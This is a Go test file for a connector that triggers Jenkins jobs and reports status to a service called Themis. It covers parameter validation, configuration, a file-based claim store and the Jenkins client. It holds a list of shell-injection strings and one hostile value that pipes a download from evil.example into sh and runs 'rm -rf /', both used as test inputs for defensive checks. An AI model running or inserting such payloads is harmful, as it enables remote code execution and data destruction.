package connector

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

// ---- rules (D31) ----

// commandSyntax is what a value would need to reach a shell or a script.
var commandSyntax = []string{
	"$(id)", "`id`", "a;id", "a|id", "a&&id", "a>out", "a<in", "${HOME}", "a\nid", "a'b", `a"b`, `a\b`,
	"a*", "a?b", "a#b", "a!b", "(a)", "{a}", "a\tb", "a\x00b", "a%0aid", "a~b",
}

func TestRules_CommandSyntaxIsRefusedByEveryRule(t *testing.T) {
	rules := []ParamRule{
		{Rule: RuleBranch}, {Rule: RuleImageTag}, {Rule: RuleRegistryPath},
		{Rule: RuleEnum, Values: []string{"full", "quick"}}, {Rule: RuleBool}, {Rule: RuleInt}, {Rule: RuleText},
	}
	for _, r := range rules {
		if err := r.valid(); err != nil {
			t.Fatalf("%s: %v", r.Rule, err)
		}
		for _, v := range commandSyntax {
			if err := r.check(v); err == nil {
				t.Errorf("rule %s let %q through", r.Rule, v)
			}
		}
	}
}

func TestRules_GoodAndBadValues(t *testing.T) {
	cases := []struct {
		rule ParamRule
		good []string
		bad  []string
	}{
		{ParamRule{Rule: RuleBranch}, []string{"main", "release/1.2", "fix_1-a"}, []string{"", "-x", "a..b", "a//b", "a/", "a.", "a.lock", "/a"}},
		{ParamRule{Rule: RuleImageTag}, []string{"1.2.3", "_x", "v1-rc.1"}, []string{"", ".x", "-x", "a/b", "a:b"}},
		{ParamRule{Rule: RuleRegistryPath}, []string{"registry.example:5000/team/app", "team/app", "app"}, []string{"", "Team/app", "a//b", "/a", "a/", "a:b/c", "a:123456/c"}},
		{ParamRule{Rule: RuleEnum, Values: []string{"full"}}, []string{"full"}, []string{"", "Full", "quick"}},
		{ParamRule{Rule: RuleBool}, []string{"true", "false"}, []string{"", "1", "True"}},
		{ParamRule{Rule: RuleInt}, []string{"0", "-5", "123456789012345678"}, []string{"", "1.5", "+1", "1234567890123456789", "1e3"}},
		{ParamRule{Rule: RuleText}, []string{"", "built by ci, run 4", "a@b:c/d+e=f"}, []string{"a;b"}},
		{ParamRule{Rule: RuleText, MaxLen: 3}, []string{"abc"}, []string{"abcd"}},
	}
	for _, c := range cases {
		for _, v := range c.good {
			if err := c.rule.check(v); err != nil {
				t.Errorf("rule %s refused %q: %v", c.rule.Rule, v, err)
			}
		}
		for _, v := range c.bad {
			if err := c.rule.check(v); err == nil {
				t.Errorf("rule %s took %q", c.rule.Rule, v)
			}
		}
	}
}

func TestRules_RuleItselfIsChecked(t *testing.T) {
	for _, r := range []ParamRule{{Rule: "shell"}, {Rule: RuleText, MaxLen: -1}, {Rule: RuleText, MaxLen: maxParamLen + 1}, {Rule: RuleEnum}} {
		if r.valid() == nil {
			t.Errorf("rule %+v was accepted", r)
		}
	}
}

func TestJobPath(t *testing.T) {
	if p, err := jobPath("team/build-image"); err != nil || p != "/job/team/job/build-image" {
		t.Fatalf("got %q, %v", p, err)
	}
	for _, bad := range []string{"", "/a", "a/", "a//b", "..", "a/../b", "a?x=1", "a b", "a/job/b#c", "a%2fb", "."} {
		if _, err := jobPath(bad); err == nil {
			t.Errorf("job name %q was accepted", bad)
		}
	}
}

func TestProfileParams(t *testing.T) {
	got, err := profileParams(map[string]any{"A": "x", "B": true, "C": float64(3), "D": 1.5})
	if err != nil || got["A"] != "x" || got["B"] != "true" || got["C"] != "3" || got["D"] != "1.5" {
		t.Fatalf("got %v, %v", got, err)
	}
	for _, v := range []any{[]any{"a"}, map[string]any{"a": 1}, nil} {
		if _, err := profileParams(map[string]any{"A": v}); err == nil {
			t.Errorf("structured value %v was accepted", v)
		}
	}
}

func TestCheckParams(t *testing.T) {
	s := JobSchema{Parameters: map[string]ParamRule{"BRANCH": {Rule: RuleBranch, Required: true}, "TAG": {Rule: RuleImageTag}}}
	if err := s.checkParams(map[string]string{"BRANCH": "main"}); err != nil {
		t.Fatal(err)
	}
	for name, params := range map[string]map[string]string{
		"unknown name": {"BRANCH": "main", "EXTRA": "x"},
		"bad value":    {"BRANCH": "main", "TAG": "a b"},
		"missing":      {"TAG": "v1"},
	} {
		if err := s.checkParams(params); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

// ---- configuration ----

func TestConfig_DefaultsAndLists(t *testing.T) {
	cfg := testConfig(t)
	if cfg.Listen != "127.0.0.1:8090" || time.Duration(cfg.MaxEventAge) != DefaultMaxEventAge ||
		time.Duration(cfg.ClaimTTL) != DefaultClaimTTL || time.Duration(cfg.CallTimeout) != DefaultCallTimeout ||
		time.Duration(cfg.RecoveryInterval) != DefaultRecoveryInterval || time.Duration(cfg.Retention) != DefaultRetention {
		t.Fatalf("defaults: %+v", cfg)
	}
	if jobs := cfg.AllowedJobs(); len(jobs) != 1 || jobs[0] != "team/build-image" {
		t.Fatalf("jobs: %v", jobs)
	}
	if !cfg.jobAllowed("prod-1", "proj-1", "team/build-image") || cfg.jobAllowed("prod-1", "proj-2", "team/build-image") ||
		cfg.jobAllowed("prod-1", "proj-1", "team/other") {
		t.Fatal("the allow-list is read wrong")
	}
}

// configWith returns a good configuration with one part replaced.
func configWith(t *testing.T, change func(m map[string]any)) []byte {
	t.Helper()
	m := map[string]any{
		"store_dir": "store", "signing_secret_env": "SIGN",
		"themis":  map[string]any{"callback_url": "https://themis.example/cb", "api_key_env": "KEY"},
		"jenkins": map[string]any{"url": "https://ci.example", "user": "u", "token_env": "TOKEN"},
		"allow":   []any{map[string]any{"product_id": "p", "project_id": "q", "jobs": []any{"build"}}},
		"jobs":    map[string]any{"build": map[string]any{"parameters": map[string]any{"BRANCH": map[string]any{"rule": "branch"}}}},
	}
	change(m)
	raw, err := json.Marshal(m)
	if err != nil {
		t.Fatal(err)
	}
	return raw
}

func TestConfig_Refusals(t *testing.T) {
	if _, err := ParseConfig(configWith(t, func(map[string]any) {})); err != nil {
		t.Fatalf("the base configuration must be good: %v", err)
	}
	sub := func(key, field string, v any) func(map[string]any) {
		return func(m map[string]any) { m[key].(map[string]any)[field] = v }
	}
	cases := map[string]func(map[string]any){
		"unknown field":          func(m map[string]any) { m["alow"] = []any{} },
		"no store":               func(m map[string]any) { m["store_dir"] = "" },
		"no signing secret":      func(m map[string]any) { m["signing_secret_env"] = "" },
		"no api key":             sub("themis", "api_key_env", ""),
		"no jenkins user":        sub("jenkins", "user", ""),
		"no jenkins token":       sub("jenkins", "token_env", ""),
		"call longer than claim": func(m map[string]any) { m["call_timeout"] = "5m" },
		"retention too short":    func(m map[string]any) { m["retention"] = "1h" },
		"cert without key":       func(m map[string]any) { m["tls_cert_file"] = "c.pem" },
		"callback over http":     sub("themis", "callback_url", "http://themis.example/cb"),
		"callback not a url":     sub("themis", "callback_url", "themis"),
		"jenkins over http":      sub("jenkins", "url", "http://ci.example"),
		"empty allow":            func(m map[string]any) { m["allow"] = []any{} },
		"allow without project":  func(m map[string]any) { m["allow"] = []any{map[string]any{"product_id": "p", "jobs": []any{"build"}}} },
		"allow with bad job": func(m map[string]any) {
			m["allow"] = []any{map[string]any{"product_id": "p", "project_id": "q", "jobs": []any{"../x"}}}
		},
		"job without schema": func(m map[string]any) { m["jobs"] = map[string]any{} },
		"reserved name": func(m map[string]any) {
			m["jobs"] = map[string]any{"build": map[string]any{"parameters": map[string]any{"THEMIS_INTENT_ID": map[string]any{"rule": "text"}}}}
		},
		"bad name": func(m map[string]any) {
			m["jobs"] = map[string]any{"build": map[string]any{"parameters": map[string]any{"a b": map[string]any{"rule": "text"}}}}
		},
		"unknown rule": func(m map[string]any) {
			m["jobs"] = map[string]any{"build": map[string]any{"parameters": map[string]any{"A": map[string]any{"rule": "shell"}}}}
		},
		"duration not text":   func(m map[string]any) { m["claim_ttl"] = 5 },
		"duration not a time": func(m map[string]any) { m["claim_ttl"] = "soon" },
	}
	for name, change := range cases {
		if _, err := ParseConfig(configWith(t, change)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	// http is taken for the machine itself only.
	for _, u := range []string{"http://localhost:8084/cb", "http://127.0.0.1:8084/cb", "http://[::1]:8084/cb"} {
		if _, err := ParseConfig(configWith(t, sub("themis", "callback_url", u))); err != nil {
			t.Errorf("%s: %v", u, err)
		}
	}
}

func TestConfig_LoadFileAndSecrets(t *testing.T) {
	path := filepath.Join(t.TempDir(), "connector.json")
	if err := os.WriteFile(path, configWith(t, func(map[string]any) {}), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := LoadConfig(path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := LoadConfig(path + ".missing"); err == nil {
		t.Fatal("a missing file must be an error")
	}
	env := map[string]string{"SIGN": "s-value", "KEY": "k-value", "TOKEN": "t-value"}
	s, err := cfg.LoadSecrets(func(k string) string { return env[k] })
	if err != nil || s.Signing != "s-value" || s.ThemisAPIKey != "k-value" || s.JenkinsToken != "t-value" {
		t.Fatalf("got %+v, %v", s, err)
	}
	delete(env, "TOKEN")
	_, err = cfg.LoadSecrets(func(k string) string { return env[k] })
	if err == nil || !strings.Contains(err.Error(), "TOKEN") || strings.Contains(err.Error(), "s-value") || strings.Contains(err.Error(), "k-value") {
		t.Fatalf("the error must name the variable and no value: %v", err)
	}
}

func TestExampleConfigIsValid(t *testing.T) {
	if _, err := LoadConfig(filepath.Join("..", "..", "connector.example.json")); err != nil {
		t.Fatalf("the shipped example must load: %v", err)
	}
}

// ---- file store (D37, D39) ----

func TestFileStore_Steps(t *testing.T) {
	s, err := OpenFileStore(filepath.Join(t.TempDir(), "store"))
	if err != nil {
		t.Fatal(err)
	}
	rec := Record{IntentID: "ev-1", State: StateReceived, Job: "build", Params: map[string]string{"A": "x"}, ReceivedAt: t0, UpdatedAt: t0}
	if _, created, err := s.Put(rec); err != nil || !created {
		t.Fatalf("put: %v %v", created, err)
	}
	again := rec
	again.Job = "other"
	if stored, created, err := s.Put(again); err != nil || created || stored.Job != "build" {
		t.Fatalf("a second put must return the stored record: %+v %v %v", stored, created, err)
	}
	// One claim wins.
	c1, ok, err := s.Claim("ev-1", "a", t0, time.Minute)
	if err != nil || !ok || c1.ClaimCounter != 1 || c1.State != StateSubmitting {
		t.Fatalf("claim: %+v %v %v", c1, ok, err)
	}
	if _, ok, _ := s.Claim("ev-1", "b", t0, time.Minute); ok {
		t.Fatal("a second claim must lose")
	}
	// A live claim is not taken over; an ended one is, and the counter moves.
	if _, ok, _ := s.TakeOver("ev-1", "b", t0, t0, time.Minute); ok {
		t.Fatal("a live claim was taken over")
	}
	later := t0.Add(5 * time.Minute)
	c2, ok, err := s.TakeOver("ev-1", "b", later, later, time.Minute)
	if err != nil || !ok || c2.ClaimCounter != 2 || c2.ClaimOwner != "b" {
		t.Fatalf("take over: %+v %v %v", c2, ok, err)
	}
	// The worker that lost its claim cannot write, in either direction.
	if ok, _ := s.Outcome("ev-1", 1, StateSubmitted, "ref", "", later); ok {
		t.Fatal("a stale counter wrote an outcome")
	}
	if ok, _ := s.Release("ev-1", 1, later); ok {
		t.Fatal("a stale counter released the claim")
	}
	if ok, err := s.Release("ev-1", 2, later); err != nil || !ok {
		t.Fatalf("release: %v %v", ok, err)
	}
	c3, ok, _ := s.Claim("ev-1", "b", later, time.Minute)
	if !ok || c3.ClaimCounter != 3 {
		t.Fatalf("claim after release: %+v", c3)
	}
	if ok, err := s.Outcome("ev-1", 3, StateSubmitted, "ref-9", "", later); err != nil || !ok {
		t.Fatalf("outcome: %v %v", ok, err)
	}
	if ok, _ := s.Outcome("ev-1", 3, StateRefused, "", "late", later); ok {
		t.Fatal("an end state was written twice")
	}
	// Reported is noted for the state that was reported, once.
	if err := s.MarkReported("ev-1", StateUncertain, later); err != nil {
		t.Fatal(err)
	}
	if got, _, _ := s.Get("ev-1"); got.Reported {
		t.Fatal("a report of another state was noted")
	}
	if err := s.MarkReported("ev-1", StateSubmitted, later); err != nil {
		t.Fatal(err)
	}
	got, found, err := s.Get("ev-1")
	if err != nil || !found || !got.Reported || got.BuildRef != "ref-9" || got.ClaimOwner != "" {
		t.Fatalf("get: %+v %v %v", got, found, err)
	}
	// Steps on an id that is not stored change nothing.
	if _, ok, err := s.Claim("ev-none", "a", t0, time.Minute); ok || err != nil {
		t.Fatalf("claim of nothing: %v %v", ok, err)
	}
	if _, found, _ := s.Get("ev-none"); found {
		t.Fatal("found a record that was never stored")
	}
}

func TestFileStore_ListAndPrune(t *testing.T) {
	dir := t.TempDir()
	s, _ := OpenFileStore(dir)
	put := func(id, state string, reported bool, at time.Time) {
		if _, _, err := s.Put(Record{IntentID: id, State: state, Reported: reported, ReceivedAt: at, UpdatedAt: at}); err != nil {
			t.Fatal(err)
		}
	}
	put("old-done", StateSubmitted, true, t0)
	put("old-unreported", StateRefused, false, t0)
	put("old-open", StateReceived, false, t0)
	put("new-done", StateSubmitted, true, t0.Add(48*time.Hour))
	list, err := s.List()
	if err != nil || len(list) != 4 || list[3].IntentID != "new-done" || list[0].IntentID != "old-done" {
		t.Fatalf("list: %+v %v", list, err)
	}
	n, err := s.Prune(t0.Add(24 * time.Hour))
	if err != nil || n != 1 {
		t.Fatalf("prune removed %d, %v", n, err)
	}
	if _, found, _ := s.Get("old-done"); found {
		t.Fatal("the old reported record is still there")
	}
	for _, id := range []string{"old-unreported", "old-open", "new-done"} {
		if _, found, _ := s.Get(id); !found {
			t.Errorf("%s was removed", id)
		}
	}
	// A file that is not a record stops the list with an error, and is never read as "nothing".
	if err := os.WriteFile(filepath.Join(dir, "broken.json"), []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := s.List(); err == nil {
		t.Fatal("a broken record must be an error")
	}
	if _, err := s.Prune(t0); err == nil {
		t.Fatal("prune must pass the error on")
	}
}

func TestFileStore_OneClaimAcrossInstances(t *testing.T) {
	dir := t.TempDir()
	first, _ := OpenFileStore(dir)
	if _, _, err := first.Put(Record{IntentID: "ev-1", State: StateReceived, ReceivedAt: t0, UpdatedAt: t0}); err != nil {
		t.Fatal(err)
	}
	var wins int32
	var wg sync.WaitGroup
	for i := 0; i < 16; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			s, err := OpenFileStore(dir)
			if err != nil {
				t.Error(err)
				return
			}
			if _, ok, err := s.Claim("ev-1", fmt.Sprintf("w-%d", i), t0, time.Minute); err != nil {
				t.Error(err)
			} else if ok {
				atomic.AddInt32(&wins, 1)
			}
		}(i)
	}
	wg.Wait()
	if wins != 1 {
		t.Fatalf("%d instances won the claim", wins)
	}
}

func TestFileStore_Errors(t *testing.T) {
	file := filepath.Join(t.TempDir(), "plain-file")
	if err := os.WriteFile(file, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := OpenFileStore(filepath.Join(file, "store")); err == nil {
		t.Fatal("a store under a plain file must not open")
	}
	dir := t.TempDir()
	s, _ := OpenFileStore(dir)
	if err := os.WriteFile(s.path("ev-bad"), []byte("not json"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, _, err := s.Get("ev-bad"); err == nil {
		t.Fatal("a broken record must be an error")
	}
	if _, _, err := s.Put(Record{IntentID: "ev-bad"}); err == nil {
		t.Fatal("put over a broken record must be an error")
	}
	if _, _, err := s.Claim("ev-bad", "a", t0, time.Minute); err == nil {
		t.Fatal("claim of a broken record must be an error")
	}
	gone := &FileStore{dir: filepath.Join(dir, "gone")}
	if _, _, err := gone.Get("ev-1"); err == nil {
		t.Fatal("a store whose directory is gone must fail")
	}
	if _, err := gone.List(); err == nil {
		t.Fatal("list in a missing directory must fail")
	}
}

// ---- status call to Themis (D28) ----

func TestThemisReporter(t *testing.T) {
	var got map[string]any
	var key string
	status := http.StatusOK
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		key = r.Header.Get("X-API-Key")
		_ = json.NewDecoder(r.Body).Decode(&got)
		w.WriteHeader(status)
	}))
	defer srv.Close()
	rep := NewThemisReporter(srv.URL, "callback-key", time.Second)
	rec := Record{IntentID: "ev-1", State: StateSubmitted, BuildRef: "https://ci.example/queue/item/4/"}
	if err := rep.Report(context.Background(), rec); err != nil {
		t.Fatal(err)
	}
	if key != "callback-key" || got["intent_id"] != "ev-1" || got["status"] != "submitted" || got["build_ref"] != rec.BuildRef {
		t.Fatalf("sent %v with key %q", got, key)
	}
	status = http.StatusForbidden
	err := rep.Report(context.Background(), rec)
	if err == nil || strings.Contains(err.Error(), "callback-key") {
		t.Fatalf("a 403 must be an error that carries no key: %v", err)
	}
	srv.Close()
	if err := rep.Report(context.Background(), rec); err == nil {
		t.Fatal("an unreachable Themis must be an error")
	}
	if err := (&ThemisReporter{URL: "://bad", Client: http.DefaultClient}).Report(context.Background(), rec); err == nil {
		t.Fatal("a bad address must be an error")
	}
}

// ---- Jenkins client ----

// fakeJenkins is a small Jenkins: it answers the calls the client makes.
type fakeJenkins struct {
	mu          sync.Mutex
	submitCode  int
	location    string
	forms       []map[string]string
	paths       []string
	auth        bool
	queue       []string // intent ids waiting in the queue
	builds      []fakeBuild
	queueCalls  int
	who         string
	tree        string
	failPath    string
	submitQuery string
}

type fakeBuild struct {
	intent string
	at     time.Time
}

func (f *fakeJenkins) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	f.mu.Lock()
	defer f.mu.Unlock()
	u, p, ok := r.BasicAuth()
	f.auth = ok && u == "themis-builder" && p == "token-1"
	f.paths = append(f.paths, r.URL.Path)
	if f.failPath != "" && strings.HasPrefix(r.URL.Path, f.failPath) {
		w.WriteHeader(http.StatusInternalServerError)
		return
	}
	params := func(intent string) string {
		return fmt.Sprintf(`[{},{"parameters":[{"name":"BRANCH","value":"main"},{"name":"PUSH","value":true},{"name":"THEMIS_INTENT_ID","value":%q}]}]`, intent)
	}
	switch {
	case strings.HasSuffix(r.URL.Path, "/buildWithParameters"):
		_ = r.ParseForm()
		form := map[string]string{}
		for k := range r.PostForm {
			form[k] = r.PostForm.Get(k)
		}
		f.forms, f.submitQuery = append(f.forms, form), r.URL.RawQuery
		if f.location != "" {
			w.Header().Set("Location", f.location)
		}
		w.WriteHeader(f.submitCode)
	case r.URL.Path == "/queue/api/json":
		var items []string
		for i, intent := range f.queue {
			items = append(items, fmt.Sprintf(`{"id":%d,"actions":%s}`, 40+i, params(intent)))
		}
		_, _ = fmt.Fprintf(w, `{"items":[%s]}`, strings.Join(items, ","))
		f.queueCalls++
	case r.URL.Path == "/whoAmI/api/json":
		_, _ = fmt.Fprint(w, f.who)
	case r.URL.Path == "/api/json":
		_, _ = fmt.Fprint(w, f.tree)
	case strings.HasSuffix(r.URL.Path, "/api/json"):
		var items []string
		for i, b := range f.builds {
			items = append(items, fmt.Sprintf(`{"url":"https://ci.example/job/x/%d/","timestamp":%d,"actions":%s}`, i+1, b.at.UnixMilli(), params(b.intent)))
		}
		_, _ = fmt.Fprintf(w, `{"builds":[%s]}`, strings.Join(items, ","))
	default:
		w.WriteHeader(http.StatusNotFound)
	}
}

func jenkinsFor(t *testing.T, f *fakeJenkins) *Jenkins {
	t.Helper()
	srv := httptest.NewServer(f)
	t.Cleanup(srv.Close)
	j := NewJenkins(srv.URL+"/", "themis-builder", "token-1", 2*time.Second)
	j.Settle = time.Millisecond
	return j
}

func TestJenkins_Submit(t *testing.T) {
	f := &fakeJenkins{submitCode: http.StatusCreated, location: "https://ci.example/queue/item/41/"}
	j := jenkinsFor(t, f)
	hostile := "$(curl evil.example|sh); rm -rf / && `id`"
	ref, err := j.Submit(context.Background(), "team/build-image", map[string]string{"BRANCH": "main", "NOTE": hostile})
	if err != nil || ref != f.location {
		t.Fatalf("got %q, %v", ref, err)
	}
	// The value travels as one form value. It is never part of the path or the query.
	if !f.auth || f.forms[0]["NOTE"] != hostile || f.forms[0]["BRANCH"] != "main" || f.submitQuery != "" ||
		f.paths[0] != "/job/team/job/build-image/buildWithParameters" {
		t.Fatalf("auth %v, form %v, query %q, path %q", f.auth, f.forms, f.submitQuery, f.paths[0])
	}
	f.location = ""
	if ref, err := j.Submit(context.Background(), "team/build-image", nil); err != nil || ref == "" {
		t.Fatalf("accepted with no queue item: %q, %v", ref, err)
	}
	// A redirect answer is taken as accepted and is not followed.
	f.submitCode, f.location = http.StatusFound, "https://ci.example/job/team/job/build-image/"
	if ref, err := j.Submit(context.Background(), "team/build-image", nil); err != nil || ref != f.location {
		t.Fatalf("redirect: %q, %v", ref, err)
	}
	var refused *RefusedError
	for _, code := range []int{http.StatusBadRequest, http.StatusForbidden, http.StatusNotFound} {
		f.submitCode = code
		if _, err := j.Submit(context.Background(), "team/build-image", nil); !errors.As(err, &refused) {
			t.Errorf("status %d must be a refusal, got %v", code, err)
		}
	}
	// A server fault, a dropped connection and a bad job name: only the last is a refusal.
	f.submitCode = http.StatusBadGateway
	if _, err := j.Submit(context.Background(), "team/build-image", nil); err == nil || errors.As(err, &refused) {
		t.Fatalf("a 502 means the result is not known, got %v", err)
	}
	calls := len(f.forms)
	if _, err := j.Submit(context.Background(), "team/../admin", nil); !errors.As(err, &refused) || len(f.forms) != calls {
		t.Fatalf("a bad job name is refused before any call: %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := j.Submit(ctx, "team/build-image", nil); err == nil || errors.As(err, &refused) {
		t.Fatalf("a call that did not complete is not a refusal: %v", err)
	}
	if _, err := (&Jenkins{BaseURL: "://bad", Client: http.DefaultClient}).Submit(context.Background(), "a", nil); err == nil {
		t.Fatal("a bad address must be an error")
	}
}

func TestJenkins_Find(t *testing.T) {
	since := t0
	// In the queue.
	f := &fakeJenkins{queue: []string{"ev-other", "ev-1"}}
	j := jenkinsFor(t, f)
	ref, found, complete, err := j.Find(context.Background(), "team/build-image", "ev-1", since)
	if err != nil || !found || !complete || !strings.HasSuffix(ref, "/queue/item/41/") {
		t.Fatalf("queue: %q %v %v %v", ref, found, complete, err)
	}
	// Among the builds.
	f = &fakeJenkins{builds: []fakeBuild{{"ev-9", t0}, {"ev-1", t0}}}
	j = jenkinsFor(t, f)
	ref, found, _, err = j.Find(context.Background(), "team/build-image", "ev-1", since)
	if err != nil || !found || ref != "https://ci.example/job/x/2/" {
		t.Fatalf("builds: %q %v %v", ref, found, err)
	}
	// Not there, and every build of the job was read: "no" may be believed. Two passes.
	f = &fakeJenkins{builds: []fakeBuild{{"ev-9", t0}}}
	j = jenkinsFor(t, f)
	_, found, complete, err = j.Find(context.Background(), "team/build-image", "ev-1", since)
	if err != nil || found || !complete || f.queueCalls != 2 {
		t.Fatalf("absent: %v %v %v, %d passes", found, complete, err, f.queueCalls)
	}
	// It left the queue and became a build between the two passes: the second pass sees it.
	// The first pass reads the queue, then the builds: the build appears only after that.
	f = &fakeJenkins{}
	j = jenkinsFor(t, f)
	go func() {
		for {
			f.mu.Lock()
			if f.queueCalls >= 1 && len(f.paths) >= 2 {
				f.builds = []fakeBuild{{"ev-1", t0}}
				f.mu.Unlock()
				return
			}
			f.mu.Unlock()
			time.Sleep(time.Millisecond)
		}
	}()
	j.Settle = 200 * time.Millisecond
	_, found, _, err = j.Find(context.Background(), "team/build-image", "ev-1", since)
	if err != nil || !found {
		t.Fatalf("second pass: %v %v", found, err)
	}
	// A full window of builds that are all newer than the request: cannot tell.
	full := make([]fakeBuild, buildsWindow)
	for i := range full {
		full[i] = fakeBuild{"ev-9", since.Add(time.Hour)}
	}
	f = &fakeJenkins{builds: full}
	j = jenkinsFor(t, f)
	_, found, complete, err = j.Find(context.Background(), "team/build-image", "ev-1", since)
	if err != nil || found || complete {
		t.Fatalf("a window that does not reach back must be incomplete: %v %v %v", found, complete, err)
	}
	// The same window reaching back before the request: complete.
	full[buildsWindow-1].at = since.Add(-time.Hour)
	_, found, complete, err = j.Find(context.Background(), "team/build-image", "ev-1", since)
	if err != nil || found || !complete {
		t.Fatalf("a window that reaches back is complete: %v %v %v", found, complete, err)
	}
	// Faults: the queue, the builds, a bad job name, a cancelled wait.
	f = &fakeJenkins{failPath: "/queue"}
	if _, _, _, err := jenkinsFor(t, f).Find(context.Background(), "team/build-image", "ev-1", since); err == nil {
		t.Fatal("a queue fault must be an error")
	}
	f = &fakeJenkins{failPath: "/job"}
	if _, _, _, err := jenkinsFor(t, f).Find(context.Background(), "team/build-image", "ev-1", since); err == nil {
		t.Fatal("a builds fault must be an error")
	}
	if _, _, _, err := j.Find(context.Background(), "a b", "ev-1", since); err == nil {
		t.Fatal("a bad job name must be an error")
	}
	f = &fakeJenkins{}
	j = jenkinsFor(t, f)
	j.Settle = time.Minute
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()
	if _, _, _, err := j.Find(ctx, "team/build-image", "ev-1", since); err == nil {
		t.Fatal("a cancelled search must be an error")
	}
}

func TestJenkins_CheckCredential(t *testing.T) {
	const known = `{"name":"themis-builder","anonymous":false,"authenticated":true}`
	allowed := []string{"team/build-image", "solo"}
	deep := `{"name":"f6","jobs":[{"name":"too-deep"}]}`
	for i := 5; i >= 1; i-- {
		deep = fmt.Sprintf(`{"name":"f%d","jobs":[%s]}`, i, deep)
	}
	cases := []struct {
		name, who, tree, fail string
		ok, broad             bool
	}{
		{"narrow", known, `{"jobs":[{"name":"team","jobs":[{"name":"build-image"}]},{"name":"solo"}]}`, "", true, false},
		{"sees another job", known, `{"jobs":[{"name":"team","jobs":[{"name":"build-image"},{"name":"deploy-prod"}]},{"name":"solo"}]}`, "", false, true},
		{"allowed job not visible", known, `{"jobs":[{"name":"solo"}]}`, "", false, false},
		{"anonymous", `{"name":"anonymous","anonymous":true,"authenticated":false}`, `{"jobs":[]}`, "", false, false},
		{"too deep", known, `{"jobs":[` + deep + `]}`, "", false, false},
		{"who fails", known, `{"jobs":[]}`, "/whoAmI", false, false},
		{"tree fails", known, `{"jobs":[]}`, "/api/json", false, false},
		{"not json", "<html>", `{"jobs":[]}`, "", false, false},
	}
	for _, c := range cases {
		f := &fakeJenkins{who: c.who, tree: c.tree, failPath: c.fail}
		err := jenkinsFor(t, f).CheckCredential(context.Background(), allowed)
		if (err == nil) != c.ok || errors.Is(err, ErrBroadCredential) != c.broad {
			t.Errorf("%s: %v", c.name, err)
		}
		for _, p := range f.paths {
			if strings.Contains(p, "build") && !strings.Contains(p, "api/json") {
				t.Errorf("%s: the check called %s; it must never start a job", c.name, p)
			}
		}
	}
}
